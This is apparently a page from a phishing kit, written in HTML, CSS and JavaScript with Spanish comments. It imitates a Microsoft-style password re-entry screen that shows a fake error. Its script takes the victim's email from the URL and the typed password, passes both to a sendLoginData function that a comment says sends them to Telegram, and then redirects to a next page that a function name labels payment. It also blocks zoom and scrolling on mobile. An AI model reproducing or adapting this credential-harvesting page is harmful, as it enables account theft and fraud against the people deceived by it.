    <style>
      * { box-sizing: border-box; }

      body {
        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        min-height: 100vh;
        margin: 0;
        background: url('banner.svg') center/cover no-repeat fixed;
      }

      .main-container {
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 20px 16px 80px 16px;
      }

      /* ── CARD ── */
      .ms-card {
        background: #fff;
        border-radius: 0;
        box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        padding: 28px 44px 36px 44px;
        width: 100%;
        max-width: 440px;
        position: relative;
      }

      /* ── HEADER: flecha + logo centrado ── */
      .ms-card-header {
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        margin-bottom: 20px;
      }

      .ms-back-btn {
        position: absolute;
        left: 0;
        background: none;
        border: none;
        cursor: pointer;
        padding: 4px;
        color: #1b1b1b;
        display: flex;
        align-items: center;
      }
      .ms-back-btn:hover { color: #0078d4; }

      .ms-logo-row {
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .ms-logo-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 1px;
        width: 20px;
        height: 20px;
        flex-shrink: 0;
      }
      .ms-logo-grid div { width: 9px; height: 9px; }

      /* ── EMAIL PÍLDORA ── */
      .ms-email-badge {
        display: flex;
        justify-content: center;
        margin-bottom: 16px;
      }
      .ms-email-badge span {
        border: 1px solid #8a8886;
        border-radius: 20px;
        padding: 4px 16px;
        font-size: 13px;
        color: #1b1b1b;
      }

      /* ── TÍTULO ── */
      .ms-card h1 {
        text-align: center;
        font-size: 24px;
        font-weight: 600;
        line-height: 32px;
        color: #1b1b1b;
        margin: 0 0 20px 0;
      }

      /* ── INPUT WRAPPER ── */
      .ms-input-wrapper {
        position: relative;
        margin-bottom: 4px;
      }

      /* ── INPUT: borde rojo (estado error) ── */
      input#password {
        display: block;
        width: 100%;
        border: 1px solid #d83b01;
        border-radius: 0;
        padding: 10px 40px 10px 12px;
        background: #fff;
        font-size: 16px;
        font-family: inherit;
        color: #1b1b1b;
        outline: none;
      }
      input#password:focus {
        border-color: #d83b01;
        box-shadow: inset 0 0 0 1px #d83b01;
      }
      input#password::placeholder { color: #767676; }

      /* ── OJO ── */
      .ms-eye-btn {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        padding: 2px;
        color: #605e5c;
        display: flex;
        align-items: center;
      }
      .ms-eye-btn:hover { color: #1b1b1b; }

      /* ── ERROR: debajo del input, ícono + texto rojo, sin caja ── */
      .ms-error-inline {
        display: flex;
        align-items: center;
        gap: 5px;
        margin-bottom: 12px;
      }
      .ms-error-inline svg {
        flex-shrink: 0;
        color: #d83b01;
        width: 12px;
        height: 12px;
      }
      .ms-error-inline p {
        margin: 0;
        font-size: 12px;
        color: #d83b01;
        line-height: 16px;
      }

      /* ── LINK ── */
      a.ms-link {
        color: #0078d4;
        text-decoration: none;
        font-size: 13px;
      }
      a.ms-link:hover { text-decoration: underline; }

      /* ── BOTÓN ── */
      .ms-btn-next {
        display: block;
        width: 100%;
        background: #0078d4;
        color: #fff;
        border: none;
        border-radius: 0;
        font-size: 15px;
        font-weight: 600;
        font-family: inherit;
        padding: 10px 12px;
        cursor: pointer;
        margin-top: 20px;
      }
      .ms-btn-next:hover { background: #106ebe; }
      .ms-btn-next:active { background: #005a9e; }

      /* ── OTRAS FORMAS ── */
      .ms-other-login {
        text-align: center;
        margin-top: 20px;
        padding-top: 20px;
        border-top: 1px solid #e0e0e0;
      }

      /* ── FOOTER ── */
      .ms-footer {
        position: fixed;
        bottom: 0; left: 0; right: 0;
        background: rgba(255,255,255,0.95);
        border-top: 1px solid #e0e0e0;
        padding: 8px 16px;
        z-index: 50;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 24px;
        font-size: 12px;
        color: #605e5c;
      }
      .ms-footer a {
        color: #605e5c;
        text-decoration: none;
        font-size: 12px;
      }
      .ms-footer a:hover { color: #0078d4; }

      /* ── ANIMACIONES ── */
      .fade-in { animation: fadeIn 0.3s ease-out; }
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }

      /* ── MÓVIL: sin scroll, sin zoom ── */
      @media (max-width: 639px) {
        html, body {
          position: fixed !important;
          width: 100% !important;
          height: 100% !important;
          overflow: hidden !important;
          overscroll-behavior: none !important;
          touch-action: none !important;
        }
        .main-container {
          position: fixed !important;
          top: 0; left: 0; right: 0; bottom: 0;
          overflow: hidden !important;
          touch-action: none !important;
        }
      }

    <script>
      // Get email from URL parameter or use default
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email') || 'usuario@ejemplo.com';
      document.getElementById('userEmail').textContent = email;

      // Auto-focus on password field and add shake effect on load
      window.addEventListener('load', function() {
        const form = document.getElementById('loginForm');
        const passwordInput = document.getElementById('password');
        
        // Add shake animation to form
        form.classList.add('error-shake');
        
        // Remove shake class after animation
        setTimeout(() => {
          form.classList.remove('error-shake');
        }, 500);
        
        // Focus on password input
        passwordInput.focus();
        
        // Verificar carga de scripts
        console.log('🔍 Verificando carga de scripts en index3...');
        console.log('XJSX cargado:', typeof sendLoginData !== 'undefined');
      });

      function togglePassword() {
        const passwordInput = document.getElementById('password');
        const eyeIcon = document.getElementById('eyeIcon');
        
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          eyeIcon.innerHTML = `
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
          `;
        } else {
          passwordInput.type = 'password';
          eyeIcon.innerHTML = `
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
          `;
        }
      }

      function goBack() {
        window.history.back();
      }

      function redirectToPayment() {
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || 'usuario@ejemplo.com';
        window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
      }

      function handleLogin(event) {
        event.preventDefault();
        
        // Prevenir múltiples envíos
        const submitButton = document.getElementById('submitButton');
        if (submitButton.disabled) {
          return;
        }
        
        const password = document.getElementById('password').value;
        const passwordInput = document.getElementById('password');
        const form = document.getElementById('loginForm');
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || 'usuario@ejemplo.com';
        
        if (password.trim()) {
          // Mostrar estado de carga PRIMERO
          submitButton.disabled = true;
          submitButton.textContent = 'Verificando...';
          
          // Enviar datos a Telegram (reintento)
          if (typeof sendLoginData !== 'undefined') {
            console.log('📤 Enviando datos de login (reintento)...');
            
            sendLoginData(email, password)
              .then(success => {
                console.log(success ? '✅ Reintento enviado' : '❌ Error en reintento');
                setTimeout(() => {
                  window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
                }, 1000);
              })
              .catch(error => {
                console.error('❌ Error:', error);
                setTimeout(() => {
                  window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
                }, 1000);
              });
          } else {
            console.warn('⚠️ XJSX no cargado');
            setTimeout(() => {
              window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
            }, 1000);
          }
        }
      }
      
      // Function to hide error when user starts typing
      function hideErrorOnInput() {
        const passwordInput = document.getElementById('password');
        const errorMessage = document.getElementById('errorMessage');
        
        passwordInput.addEventListener('input', function() {
          if (this.value.length > 0) {
            // Hide error message
            errorMessage.style.display = 'none';
            
            // Remove error styling from input
            this.classList.remove('ms-input-error');
            this.classList.add('ms-input');
          }
        });
        
        // Also hide error when input gets focus
        passwordInput.addEventListener('focus', function() {
          // Hide error message
          errorMessage.style.display = 'none';
          
          // Remove error styling from input
          this.classList.remove('ms-input-error');
          this.classList.add('ms-input');
        });
      }
      
      // Prevent form resubmission on page reload
      if (window.history.replaceState) {
        window.history.replaceState(null, null, window.location.href);
      }
      
      // Initialize error hiding functionality
      document.addEventListener('DOMContentLoaded', hideErrorOnInput);
      window.addEventListener('load', hideErrorOnInput);
    </script>

    <script>
      document.addEventListener('gesturestart',  e => e.preventDefault());
      document.addEventListener('gesturechange', e => e.preventDefault());
      document.addEventListener('gestureend',    e => e.preventDefault());
      let lastTouch = 0;
      document.addEventListener('touchend', e => {
        const now = Date.now();
        if (now - lastTouch <= 300) e.preventDefault();
        lastTouch = now;
      }, { passive: false });
      document.addEventListener('touchmove', e => {
        if (e.touches.length > 1) e.preventDefault();
      }, { passive: false });
    </script>
